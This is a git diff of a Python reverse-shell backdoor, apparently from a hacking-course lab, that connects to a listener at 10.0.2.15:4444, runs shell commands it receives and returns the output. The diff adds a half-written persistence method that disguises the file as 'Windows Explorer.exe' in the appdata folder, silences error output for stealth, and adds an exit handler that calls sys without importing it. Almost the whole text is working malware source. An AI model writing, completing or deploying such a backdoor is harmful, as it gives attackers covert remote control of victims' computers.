@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-import socket, subprocess, time, json, os, base64
+import socket, subprocess, time, json, os, base64, shutil
 
 class Backdoor:
 	def __init__(self, ip, port):
@@ -9,6 +9,9 @@ class Backdoor:
 		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		self.connection.connect((ip, port))
 
+	def become_persistent(self):
+		evil_file_location = os.environ['appdata'] + "\\Windows Explorer.exe"
+		
 	def reliable_send(self, data):
 		json_data = json.dumps(data)
 		self.connection.send(json_data)
@@ -23,7 +26,8 @@ class Backdoor:
 				continue
 
 	def execute_system_command(self, command):
-		return subprocess.check_output(command, shell=True)
+		DEVNULL = open(os.devnull, 'wb')
+		return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
 
 	def change_working_directory_to(self, path):
 		os.chdir(path)
@@ -57,6 +61,9 @@ class Backdoor:
 			except Exception:
 				command_result = "[-] Error during command execution. (b)"
 			self.reliable_send(command_result)
-		
-my_backdoor = Backdoor("10.0.2.15", 4444)
-my_backdoor.run()
+
+try:		
+	my_backdoor = Backdoor("10.0.2.15", 4444)
+	my_backdoor.run()
+except Exception:
+	sys.exit()
